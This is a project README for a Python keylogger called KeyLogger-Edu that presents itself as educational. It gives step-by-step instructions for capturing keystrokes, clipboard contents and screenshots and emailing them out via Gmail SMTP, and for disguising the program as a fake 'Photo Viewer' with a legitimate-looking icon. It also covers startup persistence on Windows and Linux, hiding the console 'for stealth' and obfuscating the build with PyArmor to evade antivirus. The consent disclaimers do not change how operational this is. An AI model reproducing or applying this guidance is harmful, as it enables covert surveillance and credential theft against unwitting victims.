# KeyLogger-Edu

## Overview
KeyLogger-Edu is a Python-based proof-of-concept project by **Pratham Mejari** designed for educational purposes to demonstrate advanced keyboard event logging and system monitoring. It captures keystrokes, clipboard content, and screenshots, logs them with timestamps, and sends reports via email using Gmail's SMTP server. The project includes a fake GUI to simulate a legitimate application and supports startup persistence on both Windows and Linux. It is intended for learning about input monitoring, threading, and ethical security testing in a controlled environment.

**⚠️ Important**: This tool must only be used with explicit user consent or for authorized security testing. Unauthorized keylogging is illegal and unethical. Pratham Mejari and contributors are not responsible for misuse.

## Features
- Captures keystrokes with timestamps (e.g., `2025-09-22 01:00:01: [DOWN]`) using `pynput`.
- Logs clipboard content on Ctrl+C/V events (e.g., passwords, URLs).
- Captures screenshots every 60 seconds and sends them as email attachments.
- Displays a fake "Photo Viewer" GUI to appear as a legitimate application.
- Logs keystrokes and clipboard data to `keylog.txt` (or `/tmp/keylog.txt` on Linux).
- Sends logs, screenshots, and system info (username, hostname, file locations) via email.
- Supports startup persistence:
  - Windows: Copies to startup folder (`C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`).
  - Linux: Adds a cron job for reboot persistence.
- Compiles to a standalone executable with PyInstaller for systems without Python.

## Prerequisites
- **Python 3.8–3.10** (for running the script directly).
- **Dependencies**:
  - `pynput`: For key event handling (`pip install pynput`).
  - `pyautogui`: For screenshot capture (`pip install pyautogui`).
  - `pyperclip`: For clipboard monitoring (`pip install pyperclip`).
  - `tkinter`: For fake GUI (built into Python; on Linux, install with `sudo apt-get install python3-tk`).
- **PyInstaller**: For creating executables (`pip install pyinstaller`).
- **PyArmor** (optional): For antivirus evasion (`pip install pyarmor`).
- **Gmail Account**: For sending emails, with an App Password enabled.
- A system with Python installed for development (not required on target systems if compiled).

## Setup Instructions
1. **Clone the Repository**:
   ```bash
   git clone https://github.com/pratham-mejari/KeyLogger-Edu.git
   cd KeyLogger-Edu
   ```

2. **Install Dependencies**:
   ```bash
   pip install pynput pyautogui pyperclip
   ```
   - On Linux, ensure `tkinter` is installed:
     ```bash
     sudo apt-get install python3-tk
     ```

3. **Configure Email Settings**:
   - Open `key.py` and update the following lines with your Gmail details:
     ```python
     EMAIL_ADDRESS = "your_email@gmail.com"  # Your Gmail address
     EMAIL_PASSWORD = "your_app_password"    # Your Gmail App Password
     TO_EMAIL = "receiver_email@gmail.com"  # Where logs are sent
     ```
   - To get a Gmail App Password:
     - Go to [myaccount.google.com](https://myaccount.google.com) > Security.
     - Enable **2-Step Verification**.
     - Go to **App Passwords**, select “Other” (e.g., “KeyLogger”), and generate a 16-character password (e.g., `xxxx yyyy zzzz wwww`).
     - Copy this into `EMAIL_PASSWORD`.

4. **Run the Script**:
   ```bash
   python3 key.py
   ```
   - A “Photo Viewer” window appears for 3 seconds.
   - Type keys, copy/paste text, and check:
     - `keylog.txt` for timestamped logs (e.g., `2025-09-22 01:00:01: [DOWN]`, `2025-09-22 01:00:02: [CLIPBOARD] mypassword`).
     - Your `TO_EMAIL` inbox (including spam/junk) for:
       - “Keylogger Location Report” (file paths, username, hostname).
       - “Keylog Update” (keys, clipboard, username, hostname).
       - “Keylogger Screenshot” (attached `.png` files).

## Making the Script Executable
To run the keylogger on a system without Python or its dependencies, compile it into a standalone executable using PyInstaller. This bundles Python, `pynput`, `pyautogui`, `pyperclip`, and `tkinter` into a single file (e.g., `.exe` for Windows).

### Steps to Create an Executable
1. **Install PyInstaller**:
   ```bash
   pip install pyinstaller
   ```

2. **Compile the Script**:
   - For Windows targets (recommended for stealth):
     ```bash
     pyinstaller --onefile --noconsole --name PhotoViewer key.py
     ```
     - `--onefile`: Creates a single `.exe` (e.g., `PhotoViewer.exe`).
     - `--noconsole`: Prevents a command window from appearing (Windows only).
     - Output: `./dist/PhotoViewer.exe`.
   - For Linux targets:
     ```bash
     pyinstaller --onefile --name PhotoViewer key.py
     ```
     - Output: `./dist/PhotoViewer`.
     - Update `LOG_FILE = "/tmp/keylog.txt"` in `key.py` to avoid permission issues.

3. **Optional: Change the Icon** (Windows):
   - Download an `.ico` file (e.g., from [iconarchive.com](https://www.iconarchive.com)) to make the executable look legitimate (e.g., a camera or game icon).
   - Run:
     ```bash
     pyinstaller --onefile --noconsole --name PhotoViewer --icon=/path/to/icon.ico key.py
     ```

4. **Optional: Avoid Antivirus Detection**:
   - Some antivirus software may flag the executable due to its keylogging or screenshot behavior. To reduce detection, obfuscate with PyArmor:
     ```bash
     pip install pyarmor
     pyarmor pack key.py
     ```
     - Output: An obfuscated executable in `./dist`.
   - Test on a system with antivirus to ensure it runs undetected.

5. **Test the Executable**:
   - Copy `PhotoViewer.exe` (Windows) or `PhotoViewer` (Linux) to a test system without Python or dependencies.
   - Run it:
     - Windows: Double-click `PhotoViewer.exe`.
     - Linux: `chmod +x PhotoViewer && ./PhotoViewer`.
   - Verify:
     - A “Photo Viewer” GUI appears for 3 seconds.
     - `keylog.txt` is created with timestamped keys and clipboard data.
     - Emails are sent to `TO_EMAIL` with logs, screenshots, and system info.
     - On Windows, check `C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PhotoViewer.exe` for startup copy.
     - On Linux, check `crontab -l` for the cron job.

## How It Works
- **Key Logging**: Captures keystrokes with readable names (e.g., `[DOWN]`, `[CTRL+C]`) and timestamps using `pynput`.
- **Clipboard Monitoring**: Logs clipboard content on Ctrl+C/V events (e.g., `2025-09-22 01:00:01: [CLIPBOARD] mypassword`).
- **Screenshot Capture**: Takes screenshots every 60 seconds, sends them as email attachments, and deletes them locally.
- **Fake GUI**: Displays a “Photo Viewer” window for 3 seconds to mimic a legitimate app.
- **Email Reporting**: Sends:
  - Initial “Keylogger Location Report” with file paths, username, and hostname.
  - Periodic “Keylog Update” emails with keys, clipboard, and system info.
  - “Keylogger Screenshot” emails with attached `.png` files.
- **Persistence**: Auto-runs on boot (Windows: startup folder; Linux: cron job).

## Ethical Considerations
- **Use with Consent**: Only run this on systems you own or have explicit permission to monitor. Unauthorized keylogging, screenshot capture, or clipboard monitoring is illegal in many jurisdictions and violates privacy laws.
- **Educational Purpose**: This project is for learning about Python, key event handling, threading, GUI creation, and SMTP integration.
- **GitHub Compliance**: Ensure compliance with GitHub’s [Acceptable Use Policies](https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies). Malicious use may lead to repository suspension.

## Troubleshooting
- **No Emails**:
  - Verify `EMAIL_ADDRESS`, `EMAIL_PASSWORD` (App Password), and `TO_EMAIL` are correct.
  - Check spam/junk folder in `TO_EMAIL`.
  - Test email setup:
    ```python
    import smtplib
    from email.mime.text import MIMEText
    msg = MIMEText("Test email")
    msg['Subject'] = 'Test'
    msg['From'] = "your_email@gmail.com"
    msg['To'] = "receiver_email@gmail.com"
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login("your_email@gmail.com", "your_app_password")
        server.sendmail("your_email@gmail.com", "receiver_email@gmail.com", msg.as_string())
    ```
- **No Logs or Screenshots**:
  - Ensure `pynput`, `pyautogui`, and `pyperclip` are installed for script mode.
  - On Linux, run `xhost +local:root` if key capture fails as root.
  - Check file permissions for `keylog.txt` or `/tmp/keylog.txt`.
- **Antivirus Flags Executable**:
  - Use PyArmor or compile on a Windows machine for better evasion.
  - Test on a clean virtual machine to identify antivirus triggers.
- **GUI Issues**:
  - Ensure `tkinter` is installed (Linux: `sudo apt-get install python3-tk`).
  - If the GUI doesn’t appear, test without `--noconsole` in PyInstaller.

## License
This project is licensed under the MIT License. See the `LICENSE` file for details.

## Author
- **Pratham Mejari**

## Disclaimer
This is an educational tool developed by Pratham Mejari for learning purposes. The author is not responsible for any misuse or damage caused by this software. Use responsibly and legally.
